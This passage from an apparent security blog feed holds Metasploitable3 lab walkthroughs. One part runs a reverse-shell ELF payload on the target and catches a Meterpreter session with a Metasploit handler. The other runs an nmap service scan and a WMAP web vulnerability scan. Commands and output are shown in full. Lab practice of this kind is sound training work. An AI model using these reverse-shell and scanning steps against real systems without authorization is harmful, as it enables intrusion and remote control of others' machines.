+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$ssh&lt;/span> vagrant@10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The authenticity of host &lt;span class="s1">&amp;#39;10.0.2.28 (10.0.2.28)&amp;#39;&lt;/span> can&lt;span class="s1">&amp;#39;t be established.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">This key is not known by any other names.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Warning: Permanently added &amp;#39;&lt;/span>10.0.2.28&lt;span class="s1">&amp;#39; (ED25519) to the list of known hosts.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">vagrant@10.0.2.28&amp;#39;&lt;/span>s password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 14.04.6 LTS &lt;span class="o">(&lt;/span>GNU/Linux 3.13.0-170-generic x86_64&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Wed Feb &lt;span class="m">21&lt;/span> 02:47:29 &lt;span class="m">2024&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vagrant@metasploitable3-ub1404:~$ chmod +x reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vagrant@metasploitable3-ub1404:~$ ls -al reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rwxr-xr-x &lt;span class="m">1&lt;/span> vagrant vagrant &lt;span class="m">207&lt;/span> Feb &lt;span class="m">21&lt;/span> 03:10 reverse-sh.elf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 4: Open a new terminal. Establish the listener for the reverse connection which our payload will be sending to our machine.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using configured payload generic/shell_reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> lhost 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">lhost&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> lport &lt;span class="m">5555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">lport&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">5555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> payload linux/x86/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; linux/x86/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; run
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Started reverse TCP handler on 10.0.2.16:5555
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Sending stage &lt;span class="o">(&lt;/span>&lt;span class="m">1017704&lt;/span> bytes&lt;span class="o">)&lt;/span> to 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Meterpreter session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.2.16:5555 -&amp;gt; 10.0.2.28:43945&lt;span class="o">)&lt;/span> at 2024-02-21 03:19:30 +0000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 5: Execute the payload on our target. Navigate back to terminal screen with the established SSH connection. Then, type the following:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">vagrant@metasploitable3-ub1404:~$ ./reverse-sh.elf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 6: Return to the terminal screen which is running the Metasploit listener. You will see a meterpreter session has started and is now open. We have sucessfully established a stable shell! We can access the shell by typing “shell” into meterpreter. We can return to the Meterpreter interface from the shell by typing “exit” into the shell.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>Meterpreter 1&lt;span class="o">)(&lt;/span>/home/vagrant&lt;span class="o">)&lt;/span> &amp;gt; shell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Process &lt;span class="m">1930&lt;/span> created.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Channel &lt;span class="m">1&lt;/span> created.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux metasploitable3-ub1404 3.13.0-170-generic &lt;span class="c1">#220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">id
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>900&lt;span class="o">(&lt;/span>vagrant&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>900&lt;span class="o">(&lt;/span>vagrant&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>900&lt;span class="o">(&lt;/span>vagrant&lt;span class="o">)&lt;/span>,27&lt;span class="o">(&lt;/span>sudo&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>Meterpreter 1&lt;span class="o">)(&lt;/span>/home/vagrant&lt;span class="o">)&lt;/span> &amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Metasploitable3 Vulnerability Scan</title><link>https://abriljordan.github.io/ajcasinillo/p/metasploitable3-vulnerability-scan/</link><pubDate>Fri, 18 Feb 2022 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/metasploitable3-vulnerability-scan/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tools-metasploit-and-nmap">Tools: Metasploit and Nmap
+&lt;/h2>&lt;h2 id="scan-for-existing-vulnerabilities">Scan for existing vulnerabilities
+&lt;/h2>&lt;h2 id="nmap-scan">Nmap scan
+&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$nmap&lt;/span> -oA 10.0.2.28 -sV -p- -Pn -n --version-all --open 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-03-06 13:31 GMT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Stats: 0:03:24 elapsed&lt;span class="p">;&lt;/span> &lt;span class="m">0&lt;/span> hosts completed &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> up&lt;span class="o">)&lt;/span>, &lt;span class="m">1&lt;/span> undergoing Connect Scan
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connect Scan Timing: About 43.68% &lt;span class="k">done&lt;/span>&lt;span class="p">;&lt;/span> ETC: 13:39 &lt;span class="o">(&lt;/span>0:04:23 remaining&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.0038s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65524&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>, &lt;span class="m">3&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp ProFTPD 1.3.5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">631/tcp open ipp CUPS 1.7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3306/tcp open mysql MySQL &lt;span class="o">(&lt;/span>unauthorized&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6697/tcp open irc UnrealIRCd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8080/tcp open http Jetty 8.1.7.v20120910
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Hosts: 127.0.2.1, METASPLOITABLE3-UB1404, irc.TestIRC.net&lt;span class="p">;&lt;/span> OSs: Unix, Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 384.36 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="metasploit">Metasploit
+&lt;/h2>&lt;h3 id="load-wmap">Load WMAP
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; load wmap
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.-.-.-..-.-.-..---..---.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">|&lt;/span>-&lt;span class="s1">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">`-----&amp;#39;&lt;/span>&lt;span class="sb">`&lt;/span>-&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span>-&lt;span class="s1">&amp;#39;`-^-&amp;#39;&lt;/span>&lt;span class="sb">`&lt;/span>-&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>WMAP 1.5.1&lt;span class="o">]&lt;/span> &lt;span class="o">===&lt;/span> et &lt;span class="o">[&lt;/span> &lt;span class="o">]&lt;/span> metasploit.com &lt;span class="m">2012&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully loaded plugin: wmap
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; wmap_sites -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> No site provided.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; wmap_sites
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Usage: wmap_sites &lt;span class="o">[&lt;/span>options&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -h Display this &lt;span class="nb">help&lt;/span> text
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -a &lt;span class="o">[&lt;/span>url&lt;span class="o">]&lt;/span> Add site &lt;span class="o">(&lt;/span>vhost,url&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -d &lt;span class="o">[&lt;/span>ids&lt;span class="o">]&lt;/span> Delete sites &lt;span class="o">(&lt;/span>separate ids with space&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -l List all available sites
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -s &lt;span class="o">[&lt;/span>id&lt;span class="o">]&lt;/span> Display site structure &lt;span class="o">(&lt;/span>vhost,url&lt;span class="p">|&lt;/span>ids&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>level&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>unicode output true/false&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="add-site-to-scan">Add Site to Scan
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; wmap_sites -a 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Site created.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; wmap_sites -l
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Available &lt;span class="nv">sites&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Host Vhost Port Proto &lt;span class="c1"># Pages # Forms&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ---- ----- ---- ----- ------- -------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> 10.0.2.28 10.0.2.28 &lt;span class="m">80&lt;/span> http &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="specify-target-url">Specify Target URL
+&lt;/h3>&lt;p>Set the specific target URL we want to scan using wmap_targets.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; wmap_targets -d &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Loading 10.0.2.28,http://10.0.2.28:80/.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="run-scanner">Run Scanner
+&lt;/h3>&lt;p>Type wmap_run at the prompt to view the options for this command.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; wmap_run -t
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Testing target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Site: 10.0.2.28 &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Port: &lt;span class="m">80&lt;/span> SSL: &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Testing started. 2024-03-05 05:15:03 +0000
